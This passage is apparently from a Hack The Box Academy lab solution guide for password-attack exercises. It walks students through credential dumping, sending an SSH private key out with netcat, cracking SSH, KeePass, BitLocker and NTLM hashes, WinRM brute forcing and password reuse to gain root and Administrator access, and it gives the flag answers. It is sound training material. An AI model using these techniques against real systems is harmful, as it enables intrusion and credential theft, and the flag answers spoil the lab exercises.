Copyright (c) 2000, 2022, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> 
```

Then, students need to enumerate the database to find the credentials `dennis:7AUgWWQEiMPdqx` within the `creds` table inside of the `users` database:

Code: sql

```sql
use users;
select * from creds;
```

Code: sql

```sql
mysql> use users;

Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> select * from creds;
+-----+--------------------+----------------+
| id  | name               | password       |
+-----+--------------------+----------------+
|   1 | Hiroko Monroe      | YJE25AGN4CX    |
|   2 | Shelley Levy       | GOK34QLM1DT    |
|   3 | Uriel Velez        | OAY05YXS1XN    |
|   4 | Vanna Benton       | EAU86WAY1BY    |
<SNIP>
| 100 | Lael Rivers        | YNQ63NWP1RD    |
| 101 | dennis             | 7AUgWWQEiMPdqx |
+-----+--------------------+----------------+
101 rows in set (0.00 sec)
```

Now, students need to SSH to the spawned target with the credentials `dennis:7AUgWWQEiMPdqx`:

Code: shell

```shell
ssh dennis@STMIP
```

```
┌─[eu-academy-1]─[10.10.14.72]─[htb-ac330204@htb-mlbuatkyxv]─[~]
└──╼ [★]$ ssh dennis@10.129.202.221

dennis@10.129.202.221's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-99-generic x86_64)

dennis@skills-medium:~$ 
```

Then, students need to enumerate the file system to discover SSH keys within the `.ssh` folder:

Code: shell

```shell
cd .ssh
ls -la
```

```
dennis@skills-medium:~$ cd .ssh
dennis@skills-medium:~/.ssh$ ls -la

total 20
drwx------ 2 dennis dennis 4096 Feb 10  2022 .
drwxr-xr-x 5 dennis dennis 4096 Mar 25  2022 ..
-rw-rw-r-- 1 dennis dennis  553 Feb 10  2022 authorized_keys
-rw------- 1 dennis dennis 2546 Feb 10  2022 id_rsa
-rw-r--r-- 1 dennis dennis  574 Feb 10  2022 id_rsa.pub
```

Subsequently, students need to transfer `id_rsa` to Pwnbox/`PMVPN` by first starting an `nc` listener to prepare to receive the file:

Code: shell

```shell
nc -lvnp PWNPO > id_rsa
```

```
┌─[eu-academy-1]─[10.10.14.72]─[htb-ac330204@htb-mlbuatkyxv]─[~]
└──╼ [★]$ nc -lvnp 4444 > id_rsa

Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
```

From the SSH session, students need to use `nc` to send the file:

Code: shell

```shell
nc PWNIP PWNPO < id_rsa
```

```
dennis@skills-medium:~/.ssh$ nc 10.10.14.72 4444 < id_rsa
```

Then, students need to download [ssh2john](https://raw.githubusercontent.com/openwall/john/bleeding-jumbo/run/ssh2john.py):

Code: shell

```shell
wget https://raw.githubusercontent.com/openwall/john/bleeding-jumbo/run/ssh2john.py
```

```
┌─[eu-academy-1]─[10.10.14.72]─[htb-ac330204@htb-mlbuatkyxv]─[~]
└──╼ [★]$ wget https://raw.githubusercontent.com/openwall/john/bleeding-jumbo/run/ssh2john.py

--2022-11-07 19:23:32--  https://raw.githubusercontent.com/openwall/john/bleeding-jumbo/run/ssh2john.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.111.133, 185.199.110.133, 185.199.108.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.111.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 9677 (9.5K) [text/plain]
Saving to: ‘ssh2john.py’

ssh2john.py                    100%[=================================================>]   9.45K  --.-KB/s    in 0s      

2022-11-07 19:23:32 (24.5 MB/s) - ‘ssh2john.py’ saved [9677/9677]
```

Subsequently, students need to extract the hash from `id_rsa` using `ssh2john.py`:

Code: shell

```shell
python3 ssh2john.py id_rsa > ssh.hash
```

```
┌─[eu-academy-1]─[10.10.14.72]─[htb-ac330204@htb-mlbuatkyxv]─[~]
└──╼ [★]$ python3 ssh2john.py id_rsa > ssh.hash
```

The hash can now be cracked with `john` and the wordlist `mut_password.list`, finding the password to be `P@ssw0rd12020!`:

Code: shell

```shell
john ssh.hash --wordlist=mut_password.list
```

```
┌─[eu-academy-1]─[10.10.14.72]─[htb-ac330204@htb-mlbuatkyxv]─[~]
└──╼ [★]$ john ssh.hash --wordlist=mut_password.list

Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
P@ssw0rd12020!   (id_rsa)
1g 0:00:00:00 DONE (2022-11-07 19:48) 7.142g/s 671742p/s 671742c/s 671742C/s yellow93..Yellow99!
Session completed
```

Students need to consider the prevalence of the password reuse security misconfiguration. Thus, although this is Denis's SSH key, he might have also used it for the `root` user with the same passphrase. Students need to connect with SSH using the `id_rsa` key, however, authenticating as `root`:

Code: shell

```shell
ssh -i id_rsa root@STMIP
```

```
┌─[eu-academy-1]─[10.10.14.72]─[htb-ac330204@htb-mlbuatkyxv]─[~]
└──╼ [★]$ ssh -i id_rsa root@10.129.202.221

Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-99-generic x86_64)

root@skills-medium:~# 
```

At last, students need to read the contents of the flag file "flag.txt" which is located at `/root/`:

Code: shell

```shell
cat /root/flag.txt
```

```
root@skills-medium:~# cat /root/flag.txt

HTB{PeopleReuse_PWsEverywhere!}
```

Answer: `HTB{PeopleReuse_PWsEverywhere!}`

# Password Attacks Lab - Hard

## Question 1

### "Examine the third target and submit the contents of flag.txt in C:\\Users\\Administrator\\Desktop\\ as the answer."

Students need to download [Password-Attacks.zip](https://academy.hackthebox.com/storage/resources/Password-Attacks.zip) and then unzip it:

Code: shell

```shell
wget https://academy.hackthebox.com/storage/resources/Password-Attacks.zip && unzip Password-Attacks.zip
```

```
┌─[us-academy-1]─[10.10.14.107]─[htb-ac413848@htb-tgnd7xlrrl]─[~]
└──╼ [★]$ wget https://academy.hackthebox.com/storage/resources/Password-Attacks.zip && unzip Password-Attacks.zip

--2022-11-22 12:14:07--  https://academy.hackthebox.com/storage/resources/Password-Attacks.zip
Resolving academy.hackthebox.com (academy.hackthebox.com)... 104.18.20.126, 104.18.21.126, 2606:4700::6812:147e, ...
Connecting to academy.hackthebox.com (academy.hackthebox.com)|104.18.20.126|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 6268 (6.1K) [application/zip]
Saving to: ‘Password-Attacks.zip’

Password-Attacks.zip                    100%[=============================================================================>]   6.12K  --.-KB/s    in 0s      

2022-11-22 12:14:07 (35.0 MB/s) - ‘Password-Attacks.zip’ saved [6268/6268]

Archive:  Password-Attacks.zip
   creating: Password-Attacks/
  inflating: __MACOSX/._Password-Attacks  
  inflating: Password-Attacks/password.list  
  inflating: __MACOSX/Password-Attacks/._password.list  
  inflating: Password-Attacks/custom.rule  
  inflating: __MACOSX/Password-Attacks/._custom.rule  
  inflating: Password-Attacks/username.list  
  inflating: __MACOSX/Password-Attacks/._username.list
```

Subsequently, students need to create a mutated wordlist with `Hashcat`, utilizing the passwords file `password.list` and `custom.rule` for the mutations rules file:

Code: shell

```shell
hashcat Password-Attacks/password.list -r Password-Attacks/custom.rule --stdout | sort -u > mut_password.list
```

```
┌─[us-academy-1]─[10.10.14.107]─[htb-ac413848@htb-tgnd7xlrrl]─[~]
└──╼ [★]$ hashcat Password-Attacks/password.list -r Password-Attacks/custom.rule --stdout | sort -u > mut_password.list
```

Then, students need to scan all TCP ports of the spawned target using `Nmap`:

Code: shell

```shell
nmap -T5 -p- -Pn STMIP
```

```
┌─[us-academy-1]─[10.10.14.107]─[htb-ac413848@htb-pxa38ykeur]─[~]
└──╼ [★]$ nmap -T5 -p- -Pn 10.129.202.222

Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-22 10:50 GMT
Warning: 10.129.202.222 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.129.202.222
Host is up (0.077s latency).
Not shown: 65454 closed tcp ports (conn-refused), 65 filtered tcp ports (no-response)
PORT      STATE SERVICE
111/tcp   open  rpcbind
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
2049/tcp  open  nfs
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49679/tcp open  unknown
49680/tcp open  unknown
49681/tcp open  unknown
```

From the output of `Nmap`, students will know that the `Windows Remote Management` (`WinRM`) service/port is open, thus, they need to target it with a bruteforce attack. Based off the information stated in the lab scenario, students need to bruteforce the username `Johanna` using the `mut_password.list` wordlist:

Code: shell

```shell
sudo cme winrm STMIP -u Johanna -p mut_password.list
```

```
┌─[us-academy-1]─[10.10.15.150]─[htb-ac-594497@htb-61ih6atwcg]─[~]
└──╼ [★]$ sudo cme winrm 10.129.202.222 -u Johanna -p mut_password.list

SMB         10.129.202.222   5985   WINSRV           [*] Windows 10.0 Build 17763 (name:WINSRV) (domain:WINSRV)
HTTP        10.129.202.222  5985   WINSRV           [*] http://10.129.202.222:5985/wsman
WINRM       10.129.202.222  5985   WINSRV           [-] WINSRV\Johanna: "SpnegoError (16): Operation not supported or available, Context: Retrieving NTLM store without NTLM_USER_FILE set to a filepath"
WINRM       10.129.202.222   5985   WINSRV           [-] WINSRV\Johanna:!
WINRM       10.129.202.222   5985   WINSRV           [-] WINSRV\Johanna:00000
WINRM       10.129.202.222   5985   WINSRV           [-] WINSRV\Johanna:00000!
WINRM       10.129.202.222  5985   WINSRV           [-] WINSRV\Johanna:000000
WINRM       10.129.202.222   5985   WINSRV           [-] WINSRV\Johanna:000000!
<SNIP>
WINRM       10.129.202.222   5985   WINSRV           [-] WINSRV\Johanna:1231234
WINRM       10.129.202.222  5985   WINSRV           [+] WINSRV\Johanna:1231234! (Pwn3d!)
```

Students will discover the credentials `johanna:1231234!`, which can be used to connect with `evil-winrm`:

Code: shell

```shell
evil-winrm -i STMIP -u johanna
```

```
┌─[us-academy-2]─[10.10.14.225]─[htb-ac330204@htb-khgjjrz5ey]─[~]
└──╼ [★]$ evil-winrm -i 10.129.202.222 -u johanna

Enter Password: 

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\johanna\Documents> 
```

Subsequently, students will find that there is a `Logins.kdbx` file which they need to download to Pwnbox/`PMVPN`, using the `download` command from `evil-winrm`:

Code: powershell

```powershell
download Logins.kdbx
```

```
*Evil-WinRM* PS C:\Users\johanna\Documents> dir

Directory: C:\Users\johanna\Documents
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/11/2022   2:13 AM           2126 Logins.kdbx

*Evil-WinRM* PS C:\Users\johanna\Documents> download Logins.kdbx

Info: Downloading Logins.kdbx to ./Logins.kdbx

Info: Download successful!
```

Then, students need to extract the hash from the password manager file `Logins.kdbx` using `keepass2john`:

Code: shell

```shell
keepass2john Logins.kdbx > keepass.hash
```

```
┌─[us-academy-2]─[10.10.14.225]─[htb-ac330204@htb-khgjjrz5ey]─[~]
└──╼ [★]$ keepass2john Logins.kdbx > keepass.hash
```

Subsequently, students need to crack the hash with `John`, using the wordlist `mut_password`:

Code: shell

```shell
john keepass.hash --wordlist=mut_password.list
```

```
┌─[us-academy-2]─[10.10.14.225]─[htb-ac330204@htb-khgjjrz5ey]─[~/Password-Attacks]
└──╼ [★]$ john keepass.hash --wordlist=mut_password.list 

Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 60000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES, 1=TwoFish, 2=ChaCha]) is 0 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Qwerty7!         (Logins)
1g 0:00:08:53 DONE (2022-11-08 19:59) 0.001875g/s 137.0p/s 137.0c/s 137.0C/s qwerty4!..qwerty8
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

The password is revealed to be `Qwerty7!`. Students need to reuse the previously attained credentials `johanna:1231234!` to connect via RDP:

Code: shell

```shell
xfreerdp /v:STMIP /u:johanna /p:1231234! /dynamic-resolution
```

```
┌─[us-academy-2]─[10.10.14.225]─[htb-ac330204@htb-eixdx1f9yx]─[~]
└──╼ [★]$ xfreerdp /v:10.129.202.222 /u:johanna /p:1231234! /dynamic-resolution

[17:26:29:129] [8139:8140] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[17:26:29:129] [8139:8140] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
[17:26:29:129] [8139:8140] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd
```

After successfully connecting, students need to open File Explorer to find `Logins.kdbx`:

![[HTB Solutions/CPTS/z. images/792490b8041cd8f4437851ff0aeb22e8_MD5.jpg]]

Students need to open it and provide `Qwerty7!` as the master password:

![[HTB Solutions/CPTS/z. images/f64e19d15c1844df5c96ce548fb7b919_MD5.jpg]]

Once students have access to the password manager, they need to right-click on `david` -> `Copy Password`:

![[HTB Solutions/CPTS/z. images/9bfda23957874cbdeeb82eb619baf9b9_MD5.jpg]]

Subsequently, students need to open `NotePad` and then paste the password in the clipboard, exposing the password `gRzX7YbeTcDG7` for `david`:

![[HTB Solutions/CPTS/z. images/6943588abc997e720eecc2873dd2300f_MD5.jpg]]

Students need to reuse the credentials `david:gRzX7YbeTcDG7` to connect via SMB:

Code: shell

```shell
smbclient -U david '\\STMIP\david'
```

```
┌─[us-academy-2]─[10.10.14.225]─[htb-ac330204@htb-eixdx1f9yx]─[~]
└──╼ [★]$ smbclient -U david '\\10.129.202.222\david'

Enter WORKGROUP\david's password: 
Try "help" to get a list of possible commands.

smb: \> 
```

Then, students will discover the `Backup.vhd` file on the share, therefore, they need to download it then exit:

Code: shell

```shell
get Backup.vhd
exit
```

```
smb: \> dir

  .                                   D        0  Fri Feb 11 10:43:03 2022
  ..                                  D        0  Fri Feb 11 10:43:03 2022
  Backup.vhd                          A 136315392  Fri Feb 11 12:16:12 2022

		10328063 blocks of size 4096. 6084601 blocks available
smb: \> get Backup.vhd

getting file \Backup.vhd of size 136315392 as Backup.vhd (3983.5 KiloBytes/sec) (average 3983.5 KiloBytes/sec)

smb: \> exit
```

Students will notice that the file is a `BitLocker` encrypted drive:

Code: shell

```shell
file Backup.vhd
```

```
┌─[us-academy-2]─[10.10.14.225]─[htb-ac330204@htb-eixdx1f9yx]─[~]
└──╼ [★]$ file Backup.vhd

Backup.vhd: DOS/MBR boot sector MS-MBR Windows 7 english at offset 0x163 "Invalid partition table" at offset 0x17b "Error loading operating system" at offset 0x19a "Missing operating system"; partition 1 : ID=0xee, start-CHS (0x0,0,2), end-CHS (0xf,254,63), startsector 1, 4294967295 sectors
```

Thus, students need to extract the hash of it using `bitlocker2john`:

Code: shell

```shell
bitlocker2john -i Backup.vhd > bitlocker.hash
```

```
┌─[us-academy-2]─[10.10.14.225]─[htb-ac330204@htb-eixdx1f9yx]─[~]
└──╼ [★]$ bitlocker2john -i Backup.vhd > bitlocker.hash

Signature found at 0x1000003
Version: 8 
Invalid version, looking for a signature with valid version...

<SNIP>

Signature found at 0x4b56000
Version: 2 (Windows 7 or later)

VMK entry found at 0x4b560b1

VMK entry found at 0x4b56191
```

Subsequently, students need to crack the hash with `john`, utilizing the `mut_password.list` as the wordlist:

```
┌─[us-academy-2]─[10.10.14.225]─[htb-ac330204@htb-eixdx1f9yx]─[~]
└──╼ [★]$ john bitlocker.hash --wordlist=mut_password.list

Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (BitLocker, BitLocker [SHA-256 AES 32/64])
Cost 1 (iteration count) is 1048576 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:08:45 1.24% (ETA: 06:06:57) 0g/s 2.495p/s 4.991c/s 4.991C/s 1234562002!..1234562004
123456789!       (?)
123456789!       (?)
```

From the output of `john`, students will know that the hash's cleartext password is `123456789!`. Then, students need to mount `Backup.vhd` using `dislocker`. Students first need to install `dislocker`, is not installed already:

Code: shell

```shell
sudo apt-get install dislocker
```

```
┌─[us-academy-2]─[10.10.14.225]─[htb-ac330204@htb-eixdx1f9yx]─[~]
└──╼ [★]$ sudo apt-get install dislocker

Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
The following additional packages will be installed:
  libdislocker0.7
The following NEW packages will be installed:
  dislocker libdislocker0.7
0 upgraded, 2 newly installed, 0 to remove and 79 not upgraded.
Need to get 69.8 kB of archives.
After this operation, 239 kB of additional disk space will be used.
Do you want to continue? [Y/n] Y
<SNIP>
Unpacking dislocker (0.7.3-2) ...
Setting up libdislocker0.7 (0.7.3-2) ...
Setting up dislocker (0.7.3-2) ...
Processing triggers for man-db (2.9.4-2) ...
Processing triggers for libc-bin (2.31-13+deb11u4) ...
Scanning application launchers
Removing duplicate launchers or broken launchers
Launchers are updated
```

Subsequently, students need to mount the drive as a loopback device and use `dislocker` in order to access the files:

```shell
sudo mkdir -p /media/bitlocker
sudo mkdir -p /media/bitlockermount
sudo losetup -f -P Backup.vhd
sudo dislocker /dev/loop0p2 -u123456789! -- /media/bitlocker
sudo mount -o loop /media/bitlocker/dislocker-file /media/bitlockermount
```
```
┌─[us-academy-2]─[10.10.14.225]─[htb-ac330204@htb-eixdx1f9yx]─[~]
└──╼ [★]$ sudo mkdir -p /media/bitlocker
┌─[us-academy-2]─[10.10.14.225]─[htb-ac330204@htb-eixdx1f9yx]─[~]
└──╼ [★]$ sudo mkdir -p /media/bitlockermount
┌─[us-academy-2]─[10.10.14.225]─[htb-ac330204@htb-eixdx1f9yx]─[~]
└──╼ [★]$ sudo losetup -f -P Backup.vhd 
┌─[us-academy-2]─[10.10.14.225]─[htb-ac330204@htb-eixdx1f9yx]─[~]
└──╼ [★]$ sudo dislocker /dev/loop0p2 -u123456789! -- /media/bitlocker
┌─[us-academy-2]─[10.10.14.225]─[htb-ac330204@htb-eixdx1f9yx]─[~]
└──╼ [★]$ sudo mount -o loop /media/bitlocker/dislocker-file /media/bitlockermount
```

Students now can access the drive contents:

```shell
cd /media/bitlockermount/
ls -la
```
```
┌─[us-academy-2]─[10.10.14.225]─[htb-ac330204@htb-eixdx1f9yx]─[~]
└──╼ [★]$ cd /media/bitlockermount/
┌─[us-academy-2]─[10.10.14.225]─[htb-ac330204@htb-eixdx1f9yx]─[/media/bitlockermount]
└──╼ [★]$ ls -la

total 19100
drwxrwxrwx 1 root root     4096 Feb 11  2022  .
drwxr-xr-x 1 root root       64 Nov  9 18:36  ..
drwxrwxrwx 1 root root        0 Feb 11  2022 '$RECYCLE.BIN'
-rwxrwxrwx 1 root root    77824 Feb 11  2022  SAM
-rwxrwxrwx 1 root root 19472384 Feb 11  2022  SYSTEM
drwxrwxrwx 1 root root     4096 Feb 11  2022 'System Volume Information'
```

Afterward, students need to run `secretsdump.py` locally against the `SAM` and `SYSTEM` files:

```shell
secretsdump.py LOCAL -sam SAM -system SYSTEM
```
```
┌─[us-academy-2]─[10.10.14.225]─[htb-ac330204@htb-eixdx1f9yx]─[/media/bitlockermount]
└──╼ [★]$ secretsdump.py LOCAL -sam SAM -system SYSTEM 

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0x62649a98dea282e3c3df04cc5fe4c130
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e53d4d912d96874e83429886c7bf22a1:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:9e73cc8353847cfce7b5f88061103b43:::
sshd:1000:aad3b435b51404eeaad3b435b51404ee:6ba6aae01bae3868d8bf31421d586153:::
david:1009:aad3b435b51404eeaad3b435b51404ee:b20d19ca5d5504a0c9ff7666fbe3ada5:::
johanna:1010:aad3b435b51404eeaad3b435b51404ee:0b8df7c13384227c017efc6db3913374:::
[*] Cleaning up... 
```

Students need to crack the NTLM hash `e53d4d912d96874e83429886c7bf22a1` for the local administrator with `Hashcat`, utilizing hashmode 1000 and `mut_password.list`:

```shell
hashcat -a 0 -m 1000 e53d4d912d96874e83429886c7bf22a1 /home/htb-ac330204/mut_password.list
```
```
┌─[us-academy-2]─[10.10.14.225]─[htb-ac330204@htb-eixdx1f9yx]─[/media/bitlockermount]
└──╼ [★]$ hashcat -a 0 -m 1000 e53d4d912d96874e83429886c7bf22a1 /home/htb-ac330204/mut_password.list

hashcat (v6.1.1) starting...

<SNIP>

Dictionary cache built:
* Filename..: /home/htb-ac330204/Password-Attacks/mut_password.list
* Passwords.: 94044
* Bytes.....: 1034072
* Keyspace..: 94044
* Runtime...: 0 secs

e53d4d912d96874e83429886c7bf22a1:Liverp00l8!     
<SNIP>
```

From the output of `Hashcat`, students will find that the password for the local Administrator is `Liverp00l8!`, therefore, they now need to connect with `xfreerdp` as the local administrator:

```shell
xfreerdp /v:STMIP /u:Administrator /p:'Liverp00l8!' /dynamic-resolution
```
```
┌─[us-academy-2]─[10.10.14.225]─[htb-ac330204@htb-eixdx1f9yx]─[/media/bitlockermount]
└──╼ [★]$ xfreerdp /v:10.129.110.108 /u:Administrator /p:'Liverp00l8!' /dynamic-resolution 

[18:51:14:368] [11958:11959] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[18:51:14:368] [11958:11959] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
[18:51:14:368] [11958:11959] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd
[18:51:14:368] [11958:11959] [INFO][com.freerdp.client.common.cmdline] - loading channelEx cliprdr
<SNIP>
```

At last, students need to read the flag from "flag.txt" on the administrator's desktop:

![[HTB Solutions/CPTS/z. images/b0215efec9f9735bd0f1e3aee89ac772_MD5.jpg]]

Answer: `HTB{PWcr4ck1ngokokok}`